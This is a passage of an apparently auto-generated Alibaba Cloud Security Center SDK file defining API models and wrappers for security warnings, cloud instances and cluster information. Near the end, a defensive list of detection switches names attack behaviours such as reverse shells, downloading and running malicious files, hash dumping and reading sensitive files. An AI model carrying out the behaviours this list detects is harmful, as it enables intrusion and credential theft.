async function describeCheckWarningMachinesWithOptions(request: DescribeCheckWarningMachinesRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarningMachines(request: DescribeCheckWarningMachinesRequest): DescribeCheckWarningMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningMachinesWithOptions(request, runtime);
}

model DescribeCheckWarningSummaryRequest {
  clusterId?: string(name='ClusterId'),
  containerFieldName?: string(name='ContainerFieldName'),
  containerFieldValue?: string(name='ContainerFieldValue'),
  currentPage?: int32(name='CurrentPage'),
  groupId?: long(name='GroupId'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  riskName?: string(name='RiskName'),
  riskStatus?: int32(name='RiskStatus'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
  strategyId?: long(name='StrategyId'),
  targetType?: string(name='TargetType'),
  typeName?: string(name='TypeName'),
  uuids?: string(name='Uuids'),
}

model DescribeCheckWarningSummaryResponseBody = {
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
  warningSummarys?: [ 
    {
      checkCount?: int32(name='CheckCount'),
      checkExploit?: boolean(name='CheckExploit'),
      databaseRisk?: boolean(name='DatabaseRisk'),
      highWarningCount?: int32(name='HighWarningCount'),
      lastFoundTime?: string(name='LastFoundTime'),
      level?: string(name='Level'),
      lowWarningCount?: int32(name='LowWarningCount'),
      mediumWarningCount?: int32(name='MediumWarningCount'),
      riskId?: long(name='RiskId'),
      riskName?: string(name='RiskName'),
      subTypeAlias?: string(name='SubTypeAlias'),
      typeAlias?: string(name='TypeAlias'),
      warningMachineCount?: int32(name='WarningMachineCount'),
    }
  ](name='WarningSummarys'),
}

model DescribeCheckWarningSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningSummaryResponseBody(name='body'),
}

async function describeCheckWarningSummaryWithOptions(request: DescribeCheckWarningSummaryRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarningSummary(request: DescribeCheckWarningSummaryRequest): DescribeCheckWarningSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningSummaryWithOptions(request, runtime);
}

model DescribeCheckWarningsRequest {
  checkId?: long(name='CheckId'),
  checkType?: string(name='CheckType'),
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  riskId?: long(name='RiskId'),
  riskStatus?: int32(name='RiskStatus'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model DescribeCheckWarningsResponseBody = {
  checkWarnings?: [ 
    {
      checkId?: long(name='CheckId'),
      checkWarningId?: long(name='CheckWarningId'),
      execErrorMessage?: string(name='ExecErrorMessage'),
      fixStatus?: int32(name='FixStatus'),
      item?: string(name='Item'),
      level?: string(name='Level'),
      reason?: string(name='Reason'),
      status?: int32(name='Status'),
      type?: string(name='Type'),
      uuid?: string(name='Uuid'),
    }
  ](name='CheckWarnings'),
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningsResponseBody(name='body'),
}

async function describeCheckWarningsWithOptions(request: DescribeCheckWarningsRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarnings(request: DescribeCheckWarningsRequest): DescribeCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningsWithOptions(request, runtime);
}

model DescribeClientConfSetupRequest {
  strategyTag?: string(name='StrategyTag', example='machineResource'),
  strategyTagValue?: string(name='StrategyTagValue', example='major'),
}

model DescribeClientConfSetupResponseBody = {
  clientConf?: {
    config?: string(name='Config', example='{"mem":"200","cpu":"10","cpu_all":"0"}'),
    strategyTag?: string(name='StrategyTag', example='machineResource'),
    strategyTagValue?: string(name='StrategyTagValue', example='major'),
  }(name='ClientConf'),
  requestId?: string(name='RequestId', example='151F6EB6-D5F3-417A-AF7B-4D84975D****'),
}

model DescribeClientConfSetupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClientConfSetupResponseBody(name='body'),
}

async function describeClientConfSetupWithOptions(request: DescribeClientConfSetupRequest, runtime: Util.RuntimeOptions): DescribeClientConfSetupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyTag)) {
    query['StrategyTag'] = request.strategyTag;
  }
  if (!Util.isUnset(request.strategyTagValue)) {
    query['StrategyTagValue'] = request.strategyTagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClientConfSetup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClientConfSetup(request: DescribeClientConfSetupRequest): DescribeClientConfSetupResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClientConfSetupWithOptions(request, runtime);
}

model DescribeClientConfStrategyRequest {
  tag?: string(name='Tag'),
  tagValue?: string(name='TagValue'),
}

model DescribeClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId'),
  targetList?: [ 
    {
      uuid?: string(name='Uuid'),
    }
  ](name='TargetList'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeClientConfStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClientConfStrategyResponseBody(name='body'),
}

async function describeClientConfStrategyWithOptions(request: DescribeClientConfStrategyRequest, runtime: Util.RuntimeOptions): DescribeClientConfStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.tagValue)) {
    query['TagValue'] = request.tagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClientConfStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClientConfStrategy(request: DescribeClientConfStrategyRequest): DescribeClientConfStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClientConfStrategyWithOptions(request, runtime);
}

model DescribeCloudCenterInstancesRequest {
  criteria?: string(name='Criteria'),
  currentPage?: int32(name='CurrentPage'),
  importance?: int32(name='Importance'),
  lang?: string(name='Lang'),
  logicalExp?: string(name='LogicalExp'),
  machineTypes?: string(name='MachineTypes'),
  noGroupTrace?: boolean(name='NoGroupTrace'),
  pageSize?: int32(name='PageSize'),
  regionId?: string(name='RegionId'),
}

model DescribeCloudCenterInstancesResponseBody = {
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus'),
      assetType?: string(name='AssetType'),
      authModifyTime?: long(name='AuthModifyTime'),
      authVersion?: int32(name='AuthVersion'),
      authVersionName?: string(name='AuthVersionName'),
      bind?: boolean(name='Bind'),
      clientStatus?: string(name='ClientStatus'),
      clusterId?: string(name='ClusterId'),
      clusterName?: string(name='ClusterName'),
      cores?: int32(name='Cores'),
      cpuInfo?: string(name='CpuInfo'),
      createdTime?: long(name='CreatedTime'),
      exposedStatus?: int32(name='ExposedStatus'),
      flag?: int32(name='Flag'),
      groupId?: long(name='GroupId'),
      groupTrace?: string(name='GroupTrace'),
      hcStatus?: string(name='HcStatus'),
      healthCheckCount?: int32(name='HealthCheckCount'),
      importance?: int32(name='Importance'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      ipListString?: string(name='IpListString'),
      kernel?: string(name='Kernel'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp'),
      macListString?: string(name='MacListString'),
      mem?: int32(name='Mem'),
      os?: string(name='Os'),
      osName?: string(name='OsName'),
      podCount?: int32(name='PodCount'),
      region?: string(name='Region'),
      regionId?: string(name='RegionId'),
      regionName?: string(name='RegionName'),
      riskCount?: string(name='RiskCount'),
      riskStatus?: string(name='RiskStatus'),
      safeEventCount?: int32(name='SafeEventCount'),
      status?: string(name='Status'),
      tag?: string(name='Tag'),
      tagId?: string(name='TagId'),
      uuid?: string(name='Uuid'),
      vendor?: int32(name='Vendor'),
      vendorName?: string(name='VendorName'),
      vpcInstanceId?: string(name='VpcInstanceId'),
      vulCount?: int32(name='VulCount'),
      vulStatus?: string(name='VulStatus'),
    }
  ](name='Instances'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model DescribeCloudCenterInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCloudCenterInstancesResponseBody(name='body'),
}

async function describeCloudCenterInstancesWithOptions(request: DescribeCloudCenterInstancesRequest, runtime: Util.RuntimeOptions): DescribeCloudCenterInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.importance)) {
    query['Importance'] = request.importance;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.noGroupTrace)) {
    query['NoGroupTrace'] = request.noGroupTrace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCloudCenterInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCloudCenterInstances(request: DescribeCloudCenterInstancesRequest): DescribeCloudCenterInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudCenterInstancesWithOptions(request, runtime);
}

model DescribeCloudProductFieldStatisticsResponseBody = {
  groupedFields?: {
    categoryCount?: string(name='CategoryCount', description='The statistics of the numbers of assets of different types. **MachineType** indicates the type of the assets. **Count** indicates the number of assets that belong to the type.
Valid values of **MachineType**:

*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a Network Address Translation (NAT) gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance', example='[{"MachineType":1,"Count":11}]'),
    instanceCount?: int32(name='InstanceCount', description='The total number of cloud services that are protected by Security Center.', example='100'),
    riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of cloud services that are at risk.', example='90'),
  }(name='GroupedFields', description='The statistics of cloud services.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeCloudProductFieldStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCloudProductFieldStatisticsResponseBody(name='body'),
}

async function describeCloudProductFieldStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeCloudProductFieldStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCloudProductFieldStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCloudProductFieldStatistics(): DescribeCloudProductFieldStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudProductFieldStatisticsWithOptions(runtime);
}

model DescribeClusterBasicInfoRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster that you want to query.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c870ec78ecbcb41d2a35c679823ef****'),
  targetType?: string(name='TargetType', description='The dimension from which you want to configure the feature. Valid values:

*   **Cluster**: the ID of the cluster', example='Cluster'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **containerNetwork**: container network topology
*   **interceptionSwitch**: cluster microsegmentation', example='containerNetwork'),
}

model DescribeClusterBasicInfoResponseBody = {
  clusterInfo?: {
    clusterId?: string(name='ClusterId', description='The ID of cluster.', example='c870ec78ecbcb41d2a35c679823ef****'),
    clusterName?: string(name='ClusterName', description='The name of the cluster.', example='testackpro'),
    clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **ManagedKubernetes**: managed Kubernetes cluster
*   **NotManagedKubernetes**: non-managed Kubernetes cluster
*   **PrivateKubernetes**: private cluster
*   **kubernetes**: dedicated Kubernetes cluster
*   **ask**: dedicated ASK cluster', example='kubernetes'),
    createTime?: long(name='CreateTime', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1662038134000'),
    currentVersion?: string(name='CurrentVersion', description='The version of the cluster.', example='1.22.10-aliyun.1'),
    instanceCount?: int32(name='InstanceCount', description='The number of instances in the cluster.', example='10'),
    regionId?: string(name='RegionId', description='The ID of the region in which the cluster is deployed.', example='cn-hangzhou'),
    state?: string(name='State', description='The status of the cluster. Valid values:

*   **unavailable**
*   **Available**
*   **Creating**
*   **CreateFailed**', example='Available'),
    targetResult?: boolean(name='TargetResult', description='Indicates whether the cluster is enabled. Valid values:

*   **true**: The cluster is enabled.
*   **false**: The cluster is disabled.', example='true'),
  }(name='ClusterInfo', description='The detailed information about the cluster.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeClusterBasicInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterBasicInfoResponseBody(name='body'),
}

async function describeClusterBasicInfoWithOptions(request: DescribeClusterBasicInfoRequest, runtime: Util.RuntimeOptions): DescribeClusterBasicInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterBasicInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterBasicInfo(request: DescribeClusterBasicInfoRequest): DescribeClusterBasicInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterBasicInfoWithOptions(request, runtime);
}

model DescribeClusterInfoListRequest {
  target?: string(name='Target', description='The operation value. The value specifies the ID of the cluster.', example='c23551de6149343e8a54e69fbefe6****'),
  targetType?: string(name='TargetType', description='The dimension based on which you want to configure the feature. Valid values:

*   **Cluster**: the ID of the cluster', example='Cluster'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **containerNetwork**: container network
*   **interceptionSwitch**: cluster microsegmentation', example='containerNetwork'),
}

model DescribeClusterInfoListResponseBody = {
  clusterList?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='cfeb7a9f99ce740e98c5595d0fe37****'),
      clusterName?: string(name='ClusterName', description='The name of the container cluster.', example='test111'),
      clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **ManagedKubernetes**: managed Kubernetes cluster
*   **NotManagedKubernetes**: non-managed Kubernetes cluster
*   **PrivateKubernetes**: private cluster
*   **kubernetes**: dedicated Kubernetes cluster
*   **ask**: dedicated ASK cluster', example='ManagedKubernetes'),
      regionId?: string(name='RegionId', description='The region of the container cluster.', example='cn-hangzhou'),
      state?: string(name='State', description='The status of the cluster. Valid values:

*   **unavailable**
*   **Available**
*   **Creating**
*   **CreateFailed**', example='Available'),
      targetResult?: boolean(name='TargetResult', description='Indicates whether the cluster is enabled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
    }
  ](name='ClusterList', description='An array that consists of the information about clusters.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeClusterInfoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterInfoListResponseBody(name='body'),
}

async function describeClusterInfoListWithOptions(request: DescribeClusterInfoListRequest, runtime: Util.RuntimeOptions): DescribeClusterInfoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterInfoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterInfoList(request: DescribeClusterInfoListRequest): DescribeClusterInfoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterInfoListWithOptions(request, runtime);
}

model DescribeClusterNetworkRequest {
  endTime?: long(name='EndTime', example='1656038940435'),
  startTime?: long(name='StartTime', example='1656038740435'),
}

model DescribeClusterNetworkResponseBody = {
  clusterNetwork?: {
    edge?: [ 
      {
        dstNodeId?: string(name='DstNodeId', example='cfb41a869c71e4678a97021582dd8****'),
        dstNodeType?: string(name='DstNodeType', example='cluster'),
        id?: string(name='Id', example='1'),
        port?: string(name='Port', example='6164'),
        srcNodeId?: string(name='SrcNodeId', example='cfb41a869c71e4678a97021582dd8****'),
        srcNodeType?: string(name='SrcNodeType', example='cluster'),
      }
    ](name='Edge'),
    node?: [ 
      {
        cnnfSwitch?: int32(name='CnnfSwitch', example='1'),
        id?: string(name='Id', example='cfeb7a9f99ce740e98c5595d0fe37****'),
        interceptionType?: int32(name='InterceptionType', example='1'),
        name?: string(name='Name', example='testwww'),
        netTopoSwitch?: string(name='NetTopoSwitch', example='ON'),
        riskLevel?: string(name='RiskLevel', example='3'),
        type?: string(name='Type', example='cluster'),
      }
    ](name='Node'),
  }(name='ClusterNetwork'),
  requestId?: string(name='RequestId', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model DescribeClusterNetworkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterNetworkResponseBody(name='body'),
}

async function describeClusterNetworkWithOptions(request: DescribeClusterNetworkRequest, runtime: Util.RuntimeOptions): DescribeClusterNetworkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterNetwork',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterNetwork(request: DescribeClusterNetworkRequest): DescribeClusterNetworkResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterNetworkWithOptions(request, runtime);
}

model DescribeClusterVulStatisticsRequest {
  clusterId?: string(name='ClusterId'),
  types?: string(name='Types'),
}

model DescribeClusterVulStatisticsResponseBody = {
  requestId?: string(name='RequestId'),
  vulStat?: {
    asapCount?: string(name='AsapCount'),
    laterCount?: string(name='LaterCount'),
    nntfCount?: string(name='NntfCount'),
  }(name='VulStat'),
}

model DescribeClusterVulStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterVulStatisticsResponseBody(name='body'),
}

async function describeClusterVulStatisticsWithOptions(request: DescribeClusterVulStatisticsRequest, runtime: Util.RuntimeOptions): DescribeClusterVulStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterVulStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterVulStatistics(request: DescribeClusterVulStatisticsRequest): DescribeClusterVulStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterVulStatisticsWithOptions(request, runtime);
}

model DescribeCommonOverallConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.61.XX.XX'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode]
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound shells
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup
